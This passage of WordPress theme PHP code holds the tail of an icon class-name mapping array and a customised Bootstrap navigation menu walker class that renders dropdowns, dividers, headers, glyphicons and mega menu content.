			'budicon-receipt-1' => 'receipt-1',
			'budicon-diamond' => 'diamond',
			'budicon-tie' => 'tie',
			'budicon-cash-dollar' => 'cash-dollar',
			'budicon-cash-euro' => 'cash-euro',
			'budicon-cash-pound' => 'cash-pound',
			'budicon-cash-yen' => 'cash-yen',
			'budicon-pants' => 'pants',
			'budicon-tshirt' => 'tshirt',
			'budicon-bag' => 'bag',
			'budicon-shirt' => 'shirt',
			'budicon-tag' => 'tag',
			'budicon-wallet' => 'wallet',
			'budicon-coins' => 'coins',
			'budicon-cash' => 'cash',
			'budicon-pack' => 'pack',
			'budicon-gift' => 'gift',
			'budicon-shopping-bag' => 'shopping-bag',
			'budicon-shopping-cart' => 'shopping-cart',
			'budicon-shopping-cart-1' => 'shopping-cart-1',
			'budicon-sun' => 'sun',
			'budicon-cloud' => 'cloud',
			'budicon-album' => 'album',
			'budicon-note-1' => 'note-1',
			'budicon-note' => 'note',
			'budicon-repeat' => 'repeat',
			'budicon-list' => 'list',
			'budicon-eject' => 'eject',
			'budicon-forward' => 'forward',
			'budicon-backward' => 'backward',
			'budicon-stop' => 'stop',
			'budicon-pause' => 'pause',
			'budicon-pause-1' => 'pause-1',
			'budicon-play' => 'play',
			'budicon-equalizer' => 'equalizer',
			'budicon-volume' => 'volume',
			'budicon-volume-1' => 'volume-1',
			'budicon-volume-2' => 'volume-2',
			'budicon-speaker' => 'speaker',
			'budicon-speaker-1' => 'speaker-1',
			'budicon-mic' => 'mic',
			'budicon-radio' => 'radio',
			'budicon-calculator' => 'calculator',
			'budicon-binoculars' => 'binoculars',
			'budicon-scissors' => 'scissors',
			'budicon-hammer' => 'hammer',
			'budicon-compass' => 'compass',
			'budicon-ruler' => 'ruler',
			'budicon-headphones' => 'headphones',
			'budicon-umbrella' => 'umbrella',
			'budicon-tv-1' => 'tv-1',
			'budicon-video' => 'video',
			'budicon-gameboy' => 'gameboy',
			'budicon-joystick' => 'joystick',
			'budicon-mouse' => 'mouse',
			'budicon-monitor' => 'monitor',
			'budicon-mobile' => 'mobile',
			'budicon-disk' => 'disk',
			'budicon-search' => 'search',
			'budicon-camera' => 'camera',
			'budicon-camera-2' => 'camera-2',
			'budicon-camera-1' => 'camera-1',
			'budicon-magnet' => 'magnet',
			'budicon-magic-wand' => 'magic-wand',
			'budicon-redo' => 'redo',
			'budicon-undo' => 'undo',
			'budicon-brush' => 'brush',
			'budicon-bookmark' => 'bookmark',
			'budicon-trash' => 'trash',
			'budicon-trash-1' => 'trash-1',
			'budicon-pencil-1' => 'pencil-1',
			'budicon-pencil-2' => 'pencil-2',
			'budicon-pencil-3' => 'pencil-3',
			'budicon-pencil-4' => 'pencil-4',
			'budicon-book-1' => 'book-1',
			'budicon-lock' => 'lock',
			'budicon-authors' => 'authors',
			'budicon-author' => 'author',
			'budicon-setting' => 'setting',
			'budicon-wrench' => 'wrench',
			'budicon-share' => 'share',
			'budicon-code' => 'code',
			'budicon-link' => 'link',
			'budicon-link-1' => 'link-1',
			'budicon-alert' => 'alert',
			'budicon-download' => 'download',
			'budicon-upload' => 'upload',
			'budicon-server' => 'server',
			'budicon-webcam' => 'webcam',
			'budicon-graph' => 'graph',
			'budicon-rss' => 'rss',
			'budicon-statistic' => 'statistic',
			'budicon-browser-2' => 'browser-2',
			'budicon-browser-3' => 'browser-3',
			'budicon-browser-4' => 'browser-4',
			'budicon-browser-5' => 'browser-5',
			'budicon-browser' => 'browser',
			'budicon-network' => 'network',
			'budicon-cone' => 'cone',
			'budicon-location' => 'location',
			'budicon-grid' => 'grid',
			'budicon-cancel-2' => 'cancel-2',
			'budicon-check-2' => 'check-2',
			'budicon-minus-2' => 'minus-2',
			'budicon-plus-2' => 'plus-2',
			'budicon-layout' => 'layout',
			'budicon-grid-1' => 'grid-1',
			'budicon-layout-1' => 'layout-1',
			'budicon-layout-2' => 'layout-2',
			'budicon-layout-3' => 'layout-3',
			'budicon-layout-4' => 'layout-4',
			'budicon-layout-5' => 'layout-5',
			'budicon-layout-6' => 'layout-6',
			'budicon-layout-7' => 'layout-7',
			'budicon-layout-8' => 'layout-8',
			'budicon-layout-9' => 'layout-9',
			'budicon-layout-10' => 'layout-10',
			'budicon-cancel' => 'cancel',
			'budicon-check-1' => 'check-1',
			'budicon-plus-1' => 'plus-1',
			'budicon-minus-1' => 'minus-1',
			'budicon-enlarge' => 'enlarge',
			'budicon-fullscreen' => 'fullscreen',
			'budicon-fullscreen-2' => 'fullscreen-2',
			'budicon-fullscreen-1' => 'fullscreen-1',
			'budicon-enlarge-1' => 'enlarge-1',
			'budicon-list-1' => 'list-1',
			'budicon-arrow-diagonal' => 'arrow-diagonal',
			'budicon-arrow-diagonal-1' => 'arrow-diagonal-1',
			'budicon-arrow-vertical' => 'arrow-vertical',
			'budicon-arrow-horizontal' => 'arrow-horizontal',
			'budicon-date' => 'date',
			'budicon-power' => 'power',
			'budicon-cloud-upload' => 'cloud-upload',
			'budicon-cloud-download' => 'cloud-download',
			'budicon-glass' => 'glass',
			'budicon-home' => 'home',
			'budicon-download-1' => 'download-1',
			'budicon-upload-1' => 'upload-1',
			'budicon-window' => 'window',
			'budicon-fullscreen-3' => 'fullscreen-3',
			'budicon-arrow' => 'arrow',
			'budicon-arrow-1' => 'arrow-1',
			'budicon-arrow-2' => 'arrow-2',
			'budicon-arrow-3' => 'arrow-3',
			'budicon-arrow-down' => 'arrow-down',
			'budicon-arrow-right' => 'arrow-right',
			'budicon-arrow-up' => 'arrow-up',
			'budicon-arrow-left' => 'arrow-left',
			'budicon-target' => 'target',
			'budicon-target-1' => 'target-1',
			'budicon-star' => 'star',
			'budicon-heart' => 'heart',
			'budicon-check' => 'check',
			'budicon-cancel-1' => 'cancel-1',
			'budicon-minus' => 'minus',
			'budicon-plus' => 'plus',
			'budicon-crop' => 'crop',
			'budicon-bell' => 'bell',
			'budicon-search-1' => 'search-1',
			'budicon-search-2' => 'search-2',
			'budicon-search-5' => 'search-5',
			'budicon-search-4' => 'search-4',
			'budicon-search-3' => 'search-3',
			'budicon-clock' => 'clock',
			'budicon-dashboard' => 'dashboard',
			'budicon-check-3' => 'check-3',
			'budicon-cancel-3' => 'cancel-3',
			'budicon-minus-3' => 'minus-3',
			'budicon-plus-3' => 'plus-3',
			'budicon-support' => 'support',
			'budicon-arrow-left-bottom' => 'arrow-left-bottom',
			'budicon-arrow-right-bottom' => 'arrow-right-bottom',
			'budicon-arrow-right-top' => 'arrow-right-top',
			'budicon-arrow-left-top' => 'arrow-left-top',
			'budicon-arrow-down-1' => 'arrow-down-1',
			'budicon-arrow-right-1' => 'arrow-right-1',
			'budicon-arrow-up-1' => 'arrow-up-1',
			'budicon-arrow-left-1' => 'arrow-left-1',
			'budicon-link-external' => 'link-external',
			'budicon-link-incoming' => 'link-incoming',
			'budicon-aid-kit' => 'aid-kit',
			'budicon-lab' => 'lab',
			'budicon-flag' => 'flag',
			'budicon-award' => 'award',
			'budicon-award-1' => 'award-1',
			'budicon-award-2' => 'award-2',
			'budicon-timer' => 'timer',
			'budicon-tv' => 'tv',
			'budicon-mic-1' => 'mic-1',
			'budicon-bicycle' => 'bicycle',
			'budicon-bus' => 'bus',
			'budicon-car' => 'car',
			'budicon-direction' => 'direction',
			'budicon-leaf-1' => 'leaf-1',
			'budicon-bulb' => 'bulb',
			'budicon-tree' => 'tree',
			'budicon-home-1' => 'home-1',
			'budicon-pin' => 'pin',
			'budicon-clock-1' => 'clock-1',
			'budicon-date-2' => 'date-2',
			'budicon-timer-1' => 'timer-1',
			'budicon-clock-2' => 'clock-2',
			'budicon-time' => 'time',
			'budicon-clock-3' => 'clock-3',
			'budicon-date-1' => 'date-1',
			'budicon-map' => 'map',
			'budicon-pin-1' => 'pin-1',
			'budicon-compass-1' => 'compass-1',
			'budicon-crown' => 'crown',
			'budicon-pointer' => 'pointer',
			'budicon-pointer-1' => 'pointer-1',
			'budicon-pointer-2' => 'pointer-2',
			'budicon-puzzle' => 'puzzle',
			'budicon-gender-female' => 'gender-female',
			'budicon-gender-male' => 'gender-male',
			'budicon-globe' => 'globe',
			'budicon-cube' => 'cube',
			'budicon-book-2' => 'book-2',
			'budicon-notebook' => 'notebook',
			'budicon-image' => 'image',
			'budicon-image-1' => 'image-1',
			'budicon-image-2' => 'image-2',
			'budicon-image-3' => 'image-3',
			'budicon-camera-3' => 'camera-3',
			'budicon-camera-4' => 'camera-4',
			'budicon-video-1' => 'video-1',
			'budicon-briefcase' => 'briefcase',
			'budicon-briefcase-1' => 'briefcase-1',
			'budicon-document' => 'document',
			'budicon-document-1' => 'document-1',
			'budicon-document-2' => 'document-2',
			'budicon-document-3' => 'document-3',
			'budicon-paper' => 'paper',
			'budicon-note-2' => 'note-2',
			'budicon-note-3' => 'note-3',
			'budicon-note-5' => 'note-5',
			'budicon-attachment' => 'attachment',
			'budicon-note-4' => 'note-4',
			'budicon-note-6' => 'note-6',
			'budicon-note-7' => 'note-7',
			'budicon-note-8' => 'note-8',
			'budicon-list-2' => 'list-2',
			'budicon-presentation' => 'presentation',
			'budicon-presentation-1' => 'presentation-1',
			'budicon-pie-cart' => 'pie-cart',
			'budicon-document-4' => 'document-4',
			'budicon-book-3' => 'book-3',
			'budicon-note-9' => 'note-9',
			'budicon-note-10' => 'note-10',
			'budicon-radion' => 'radion',
			'budicon-box' => 'box',
			'budicon-video-2' => 'video-2',
			'budicon-glasses' => 'glasses',
			'budicon-box-1' => 'box-1',
			'budicon-printer' => 'printer',
			'budicon-printer-1' => 'printer-1',
			'budicon-pin-2' => 'pin-2',
			'budicon-pin-3' => 'pin-3',
			'budicon-folder' => 'folder',
			'budicon-book-4' => 'book-4',
			'budicon-cancel-4' => 'cancel-4',
			'budicon-check-4' => 'check-4',
			'budicon-minus-4' => 'minus-4',
			'budicon-plus-4' => 'plus-4',
			'budicon-equal' => 'equal',
			'budicon-book-5' => 'book-5',
			'budicon-book-6' => 'book-6',
			'budicon-newspaper' => 'newspaper',
			'budicon-image-4' => 'image-4',
			'budicon-telephone' => 'telephone',
			'budicon-mic-2' => 'mic-2',
			'budicon-paper-plane' => 'paper-plane',
			'budicon-pen' => 'pen',
			'budicon-profile' => 'profile',
			'budicon-mail' => 'mail',
			'budicon-mail-1' => 'mail-1',
			'budicon-megaphone' => 'megaphone',
			'budicon-comment' => 'comment',
			'budicon-comment-1' => 'comment-1',
			'budicon-comment-2' => 'comment-2',
			'budicon-comment-3' => 'comment-3',
			'budicon-comment-4' => 'comment-4',
			'budicon-comment-5' => 'comment-5',
		);
	}
}

/**
 * Class Name: wp_bootstrap_navwalker
 * GitHub URI: https://github.com/twittem/wp-bootstrap-navwalker
 * Description: A custom WordPress nav walker class to implement the Bootstrap 3 navigation style in a custom theme using the WordPress built in menu manager.
 * Version: 2.0.4
 * Author: Edward McIntyre - @twittem
 * License: GPL-2.0+
 * License URI: http://www.gnu.org/licenses/gpl-2.0.txt
 */

class ebor_bootstrap_navwalker extends Walker_Nav_Menu {

	/**
	 * @see Walker::start_lvl()
	 * @since 3.0.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param int $depth Depth of page. Used for padding.
	 */
	public function start_lvl( &$output, $depth = 0, $args = array() ) {
		$indent = str_repeat( "\t", $depth );
		$output .= "\n$indent<ul role=\"menu\" class=\" dropdown-menu\">\n";
	}

	/**
	 * @see Walker::start_el()
	 * @since 3.0.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $item Menu item data object.
	 * @param int $depth Depth of menu item. Used for padding.
	 * @param int $current_page Menu item ID.
	 * @param object $args
	 */
	public function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {
		$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

		/**
		 * Dividers, Headers or Disabled
		 * =============================
		 * Determine whether the item is a Divider, Header, Disabled or regular
		 * menu item. To prevent errors we use the strcasecmp() function to so a
		 * comparison that is not case sensitive. The strcasecmp() function returns
		 * a 0 if the strings are equal.
		 */
		if ( strcasecmp( $item->attr_title, 'divider' ) == 0 && $depth === 1 ) {
			$output .= $indent . '<li role="presentation" class="divider">';
		} else if ( strcasecmp( $item->title, 'divider') == 0 && $depth === 1 ) {
			$output .= $indent . '<li role="presentation" class="divider">';
		} else if ( strcasecmp( $item->attr_title, 'dropdown-header') == 0 && $depth === 1 ) {
			$output .= $indent . '<li role="presentation" class="dropdown-header">' . esc_attr( $item->title );
		} else if ( strcasecmp($item->attr_title, 'disabled' ) == 0 ) {
			$output .= $indent . '<li role="presentation" class="disabled"><a href="#">' . esc_attr( $item->title ) . '</a>';
		} else {

			$class_names = $value = '';

			$classes = empty( $item->classes ) ? array() : (array) $item->classes;
			$classes[] = 'menu-item-' . $item->ID;

			$class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );

			if ( $args->has_children && $depth == 0 ){
				$class_names .= ' dropdown';
			} elseif ( $args->has_children ){
				$class_names .= ' dropdown-submenu';
			}

			if ( in_array( 'current-menu-item', $classes ) )
				$class_names .= ' active';

			$class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';

			$id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
			$id = $id ? ' id="' . esc_attr( $id ) . '"' : '';

			$output .= $indent . '<li' . $id . $value . $class_names .'>';

			$atts = array();
			$atts['title']  = ! empty( $item->title )	? $item->title	: '';
			$atts['target'] = ! empty( $item->target )	? $item->target	: '';
			$atts['rel']    = ! empty( $item->xfn )		? $item->xfn	: '';

			// If item has_children add atts to a.
			if ( $args->has_children && $depth === 0 ) {
				$atts['href'] = ! empty( $item->url ) ? $item->url : '';
				$atts['data-toggle']	= 'dropdown';
				$atts['class']			= 'dropdown-toggle js-activated';
			} else {
				$atts['href'] = ! empty( $item->url ) ? $item->url : '';
			}

			$atts = apply_filters( 'nav_menu_link_attributes', $atts, $item, $args );

			$attributes = '';
			foreach ( $atts as $attr => $value ) {
				if ( ! empty( $value ) ) {
					$value = ( 'href' === $attr ) ? esc_url( $value ) : esc_attr( $value );
					$attributes .= ' ' . $attr . '="' . $value . '"';
				}
			}

			$item_output = $args->before;

			/*
			 * Glyphicons
			 * ===========
			 * Since the the menu item is NOT a Divider or Header we check the see
			 * if there is a value in the attr_title property. If the attr_title
			 * property is NOT null we apply it as the class name for the glyphicon.
			 */
			if ( ! empty( $item->attr_title ) )
				$item_output .= '<a'. $attributes .'><span class="glyphicon ' . esc_attr( $item->attr_title ) . '"></span>&nbsp;';
			else
				$item_output .= '<a'. $attributes .'>';

			$item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
			$item_output .= ( $args->has_children && 0 === $depth ) ? '</a>' : '</a>';
			$item_output .= $args->after;
			
			/**
			 * Check if menu item object is a mega menu object.
			 * If it is, display the mega menu content.
			 * Otherwise render elements as normal
			 */
			if( $item->object == 'mega_menu' ) {
				$output .= '<div class="yamm-content row">' . apply_filters('the_content', get_post_field('post_content', $item->object_id)) . '</div>';
			} else {
				$output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
			}

		}
	}

	/**
	 * Traverse elements to create list from elements.
	 *
	 * Display one element if the element doesn't have any children otherwise,
	 * display the element and its children. Will only traverse up to the max
	 * depth and no ignore elements under that depth.
	 *
	 * This method shouldn't be called directly, use the walk() method instead.
	 *
	 * @see Walker::start_el()
	 * @since 2.5.0
	 *
	 * @param object $element Data object
	 * @param array $children_elements List of elements to continue traversing.
	 * @param int $max_depth Max depth to traverse.
	 * @param int $depth Depth of current element.
	 * @param array $args
	 * @param string $output Passed by reference. Used to append additional content.
	 * @return null Null on failure with no changes to parameters.
	 */
	public function display_element( $element, &$children_elements, $max_depth, $depth, $args, &$output ) {
        if ( ! $element )
            return;

        $id_field = $this->db_fields['id'];

        // Display this element.
        if ( is_object( $args[0] ) )
           $args[0]->has_children = ! empty( $children_elements[ $element->$id_field ] );

        parent::display_element( $element, $children_elements, $max_depth, $depth, $args, $output );
    }

	/**
	 * Menu Fallback
	 * =============
	 * If this function is assigned to the wp_nav_menu's fallback_cb variable
	 * and a manu has not been assigned to the theme location in the WordPress
	 * menu manager the function with display nothing to a non-logged in user,
	 * and will add a link to the WordPress menu manager if logged in as an admin.
	 *
	 * @param array $args passed from the wp_nav_menu function.
	 *
	 */
	public static function fallback( $args ) {
		if ( current_user_can( 'manage_options' ) ) {

			extract( $args );

			$fb_output = null;

			if ( $container ) {
				$fb_output = '<' . $container;

				if ( $container_id )
					$fb_output .= ' id="' . $container_id . '"';

				if ( $container_class )
					$fb_output .= ' class="' . $container_class . '"';

				$fb_output .= '>';
			}

			$fb_output .= '<ul';

			if ( $menu_id )
				$fb_output .= ' id="' . $menu_id . '"';

			if ( $menu_class )
				$fb_output .= ' class="' . $menu_class . '"';

			$fb_output .= '>';
			$fb_output .= '<li><a href="' . admin_url( 'nav-menus.php' ) . '">Add a menu</a></li>';
			$fb_output .= '</ul>';

			if ( $container )
				$fb_output .= '</' . $container . '>';

			echo $fb_output;
		}
	}
}